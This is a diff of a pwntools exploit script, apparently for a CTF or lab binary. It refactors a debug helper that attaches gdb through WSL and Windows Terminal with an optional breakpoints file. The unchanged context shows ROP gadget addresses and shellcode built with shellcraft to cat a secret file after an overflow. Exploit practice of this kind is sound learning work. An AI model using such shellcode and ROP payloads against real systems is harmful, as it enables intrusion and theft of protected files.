@@ -1,4 +1,3 @@
-# My own code
 import os
 from pwn import *
 
@@ -17,11 +16,19 @@ syscall = p64(0x485ac9)  # syscall; ret
 nop = p64(0x401d1f)
 
 
-def run_exploit(debug):
+def run_exploit(debug, file_breakpoints):
     p = process(file_binary)
     if debug == True:
         pid = util.proc.pidof(p)[0]
-        cmd = f"cmd.exe /c start wt -p 'PowerShell' -d . wsl -e bash -c 'gdb -p {pid}\; exec $BASH'"
+
+        gdb = f"gdb -q -p {pid}"
+        if file_breakpoints:
+            gdb += f" -x {file_breakpoints}"
+            print(f"Use breakpoints from {file_breakpoints}")
+
+        new_tab = "wt -p 'PowerShell' -d ."  # Open new tab in Windows Terminal (PowerShell profile and current dir)
+        wsl = f"wsl -e bash -c '{gdb}\; exec $BASH'"
+        cmd = f"cmd.exe /c start {new_tab} {wsl}"
         os.system(cmd)
         util.proc.wait_for_debugger(pid)
     return p
@@ -96,7 +103,8 @@ def sys_read(fd, address, length):
 
 
 def main():
-    p = run_exploit(True)
+    file_breakpoints = "breaks64.gdb"
+    p = run_exploit(True, file_breakpoints)
     sc = asm(shellcraft.cat(file_secret) + shellcraft.echo("\n") + shellcraft.exit(22))
 
     # Overflow
